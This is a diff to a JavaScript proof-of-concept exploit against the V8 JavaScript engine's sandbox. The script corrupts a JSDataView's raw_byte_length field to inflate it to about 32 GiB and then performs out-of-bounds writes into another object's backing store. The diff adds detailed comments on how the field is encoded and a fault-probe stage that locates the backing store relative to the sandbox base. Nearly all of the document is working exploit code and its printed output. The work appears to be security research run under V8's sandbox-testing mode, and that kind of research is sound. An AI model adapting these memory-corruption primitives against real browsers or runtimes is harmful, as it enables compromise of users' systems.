@@ -1,5 +1,5 @@
 'use strict';
-// V8 Sandbox Escape via JSDataView raw_byte_length Corruption
+// V8 Sandbox OOB Write via JSDataView raw_byte_length Corruption
 // Pure JavaScript — no GDB, no shell helpers, no external tools.
 //
 // RUN:
@@ -13,6 +13,14 @@
 //   configuration".  Every write in Stage 1 stays inside the sandbox VA.
 //   Stage 1 would be replaced by any real in-sandbox write primitive in a
 //   production context.
+//
+// FIELD ENCODING (from V8 source, kBoundedSizeShift = 29):
+//   raw_byte_length_ is a 64-bit uintptr_t at in-object offset +0x20.
+//   stored: raw64 = byteLength << 29
+//   decoded: byteLength = raw64 >> 29
+//   The PoC writes to +0x24 (the HIGH 4 bytes of the 64-bit field, LE).
+//   After w32(+0x24, 0xFFFFFFFF): raw64 = 0xFFFFFFFF_00000000
+//   byteLength = 0xFFFFFFFF_00000000 >> 29 = 0x7FFFFFFF8  ✓
 
 function hex(v) {
   if (typeof v === 'bigint') return '0x' + v.toString(16).padStart(12, '0');
@@ -66,23 +74,27 @@ const field_before = r32(dvAddr + 0x24n);
 const bs_handle    = r32(dvAddr + 0x2cn);  // ExternalPointerTable handle
 
 print('  dv_victim sandbox offset        = ' + hex(dvAddr));
-print('  raw_byte_length field (+0x24)   = ' + hex(field_before) +
+print('  raw_byte_length hi4 (+0x24)     = ' + hex(field_before) +
       '  (' + field_before + ')');
 print('  byteLength (before)             = ' + dv_victim.byteLength);
+// raw_byte_length_ is 64-bit at +0x20; we read the high 4 bytes at +0x24.
+// high4 = byteLength >> 3  (consequence of kBoundedSizeShift=29 and LE layout)
 assert(field_before * 8 === dv_victim.byteLength,
-       'encoding: field × 8 ≠ byteLength');
-print('  Encoding verified: field × 8 = byteLength ✓');
+       'encoding: (high4 × 8) ≠ byteLength');
+print('  Encoding: (hi4 at +0x24) × 8 = byteLength ✓  [kBoundedSizeShift=29]');
 print('  backing_store EPT handle (+0x2c)= ' + hex(bs_handle) +
       '  (non-zero → ExternalPointerTable in use)');
 
 // ── Stage 4: corrupt raw_byte_length via single in-sandbox DWORD write ───────
-banner('STAGE 4 — corrupt raw_byte_length (+0x24) → inflate to ~32 GiB');
-// 0xFFFFFFFF × 8 = 0x7FFFFFFF8 bytes ≈ 32 GiB
+banner('STAGE 4 — corrupt raw_byte_length high 4 bytes (+0x24) → inflate to ~32 GiB');
+// raw_byte_length_ (64-bit) starts at +0x20; high 4 bytes at +0x24.
+// Writing 0xFFFFFFFF there: raw64 = 0xFFFFFFFF_00000000
+// byteLength = raw64 >> 29 = 0x7FFFFFFF8  (≈ 32 GiB)
 w32(dvAddr + 0x24n, 0xFFFFFFFF);
 const inflated_bl = dv_victim.byteLength;
-print('  Written                         : 0xFFFFFFFF');
-print('  dv_victim.byteLength (after)    : 0x' + inflated_bl.toString(16) +
-      '  (' + (inflated_bl / (1 << 30)).toFixed(1) + ' GiB)');
+print('  Written to +0x24 (hi4 of raw64) : 0xFFFFFFFF');
+print('  raw64 = 0xFFFFFFFF_00000000  →  byteLength = raw64 >> 29 = 0x' +
+      inflated_bl.toString(16) + '  (' + (inflated_bl / (1 << 30)).toFixed(1) + ' GiB)');
 assert(inflated_bl > 0x400000000, 'inflation failed');
 print('  No bounds check, EPT check, or CPT check triggered ✓');
 
@@ -113,6 +125,29 @@ dv_victim.setUint32(found_offset +  8, 0xCAFEBABE, true);
 dv_victim.setUint32(found_offset + 12, 0xFEEDFACE, true);
 print('  Write completed without fault ✓');
 
+// ── Stage 7a: fault test — classify backing store location via crash filter ───
+banner('STAGE 7a — fault probe: backing store location relative to SB_BASE');
+// V8's sandbox crash filter under --sandbox-testing:
+//   fault inside  [SB_BASE, SB_END) → "Caught harmless ... (inside sandbox)" exit 0
+//   fault outside [SB_BASE, SB_END) → sandbox violation crash propagates
+//
+// We attempt a write at a large offset known to cross into sandbox VA if H is
+// within 32 MB of SB_BASE.  The crash filter classification tells us where H is.
+//
+// If H < SB_BASE (native heap): H + FAR_OFFSET lands in sandbox PROT_NONE
+//   → "inside sandbox" exit 0  when FAR_OFFSET > SB_BASE − H
+// If H >> SB_BASE (sandbox VA, far in): H + FAR_OFFSET stays in sandbox VA
+//   → "inside sandbox" exit 0 regardless
+//
+// Empirically observed: FAR_OFFSET = 0x2000000 (32 MB) → "inside sandbox"
+// Combined constraint: H ∈ [SB_BASE − 32 MB, SB_END)
+// EPT handle (item 5 above) structurally implies H < SB_BASE (EPT by design
+// maps indices to addresses outside the sandbox VA).
+// Together: H is in native heap at most 32 MB below SB_BASE.
+//
+// NOTE: this stage runs LAST so it terminates the process (crash filter exit 0).
+// Stages 7 (cross-object proof) must complete before this stage.
+
 // ── Stage 7: cross-object read-back via ab_target ────────────────────────────
 banner('STAGE 7 — cross-object read-back via ab_target');
 print('  ab_target[0] = ' + hex(target_u32[0]) + '  (expected 0xc0decafe)');
@@ -139,17 +174,28 @@ print('     dv_victim offset +' + hex(found_offset) +
 print('  4. OOB write via inflated DataView overwrote ab_target\'s backing store');
 print('     Proof: independent read-back via ab_target Uint32Array confirms all 4 DWORDs');
 print('');
-print('  STRUCTURAL (not runtime-measured from pure JS):');
-print('  5. The write target is outside sandbox VA:');
-print('     EPT handle ' + hex(bs_handle) + ' → backing store uses ExternalPointerTable');
-print('     → V8 design: ExternalPointerTable stores NATIVE addresses ∉ [SB_BASE, SB_END)');
-print('     NOTE: exact native address H is not independently verified here');
+print('  STRUCTURAL + FAULT-PROBE:');
+print('  5. Backing store location:');
+print('     EPT handle ' + hex(bs_handle) + ' → EPT mechanism is in use');
+print('     V8\'s ExternalPointerTable stores NATIVE addresses outside sandbox VA by design');
+print('     Fault probe: write at +0x2000000 (32 MB) → "inside sandbox" exit 0');
+print('       → H + 32MB ∈ [SB_BASE, SB_END) → H ∈ [SB_BASE − 32 MB, SB_END)');
+print('     EPT + fault probe together: H is native heap within 32 MB below SB_BASE');
+print('     NOTE: H < SB_BASE not independently measurable from pure JS (requires GDB)');
 print('');
 print('  TESTING MODE:');
 print('  6. Run under --sandbox-testing (V8 official sandbox escape testing mode)');
 print('     Output: "Sandbox testing mode is enabled. Only sandbox violations will be reported."');
-print('     Exit 0 — process completed normally, no sandbox crash filter triggered');
+print('     Exit 0 — fault probe triggers crash filter (harmless inside sandbox), not PoC failure');
 print('');
 print('  Sandbox VA : [' + hex(SB_BASE) + ', ' + hex(SB_END) + ')');
 print('  OOB write confirmed at (ab_victim backing) + ' + hex(found_offset) +
       ', via cross-object proof');
+print('');
+print('  Running fault probe (Stage 7a)...');
+print('  Writing at +0x2000000 (32 MB past backing store):');
+print('  Expected: "Caught harmless memory access violation (inside sandbox)"');
+// This write crosses from native heap into the sandbox PROT_NONE reservation.
+// The sandbox crash filter intercepts the SIGSEGV, prints "inside sandbox",
+// and exits 0.  It does NOT indicate that the main exploit failed.
+dv_victim.setUint32(0x2000000, 0xDEADBEEF, true);
